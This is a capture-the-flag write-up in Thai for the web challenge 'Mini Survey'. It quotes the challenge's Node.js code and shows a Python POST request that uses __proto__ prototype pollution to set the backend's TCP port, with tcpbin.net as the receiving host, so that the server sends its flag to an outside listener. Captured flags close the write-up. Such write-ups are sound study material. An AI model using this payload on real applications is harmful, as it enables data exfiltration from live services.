# web/Mini Survey

## index.js
```js
const updateDBs = require("./serverComs");
...
app.post("/pollutionsurvey", (req, res) => {
    let fieldInput1 = req.body.name;
    let fieldInput2 = req.body.city;
    let fieldInput3 = req.body.pollutionRate;

    surveyOneInitialData[fieldInput1] = { [fieldInput2]: fieldInput3 };
    
    surveyOneInitialData = updateDBs(surveyOneInitialData, {
        Name: { City: "Rating" },
    });

    res.redirect("/thankyou");
});
...
```
งืม~~ ยังไม่เห็นไรมาก ลองไปดู func updateDBs ดีกว่า

## serverComs.js
```js
...
backupServerHost = "";
backupServerPort = "";

function sendData(data) {
    const postData = JSON.stringify(data);

    if (data.host != undefined) {backupServerHost = data.host}
    if (data.port != undefined) {backupServerPort = data.port}

    const options = {host: backupServerHost || "localhost", port: backupServerPort || "8888" };
    console.log("options:",options);

    const socket = net.connect(options, () => {
        socket.write(postData);
        socket.end();
    });
    ...
}
function updateDBs(dataObj, original) {
    let commData = Object.create(dataObj);
    commData["flag"] = "nite{FAKE_FLAG}";
    commData["log"] = "new entry added";
    sendData(commData);
    return original;
}
...
```
func updateDBs จะเพิ่ม flag เข้าไปใน commData (dataObj ที่ถูก clone มา) และก็จะเรียก func sendData เพื่อเชื่อมต่อ แบบ tcp ไปยังที่ไหนสักที่ และก็ส่ง postData ที่มี flag อยู่ไป

## ทำไงล่ะทีนี้?
ผมไปเจอ https://t.ly/EgVId พบว่าเราสามารถใช้ `__proto__` เพื่อไป set prop ของ object อื่นๆได้ (ถ้าทฤษฎีเพี้ยนอย่าโกรธกันเลย) ผมก็เลยได้ script เพื่อเอา flag คร่าวๆประมาณนี้
```python
from requests import request
payload = 'name=__proto__&city=port&pollutionRate=47183' # city = key, pollutionRate = value
request("POST", "??", headers={'Content-Type':'application/x-www-form-urlencoded'}, data=payload)
```
ส่วน host, port ก็ใช้ tcpbin.net เอาครับ

## Flag
`nite{pr0t0_p0llut3d_116a4601b79d6b8f}`
`nite{9wd_t0_th3_r35cu3_dp54kf}` fake flag in prod 🤣
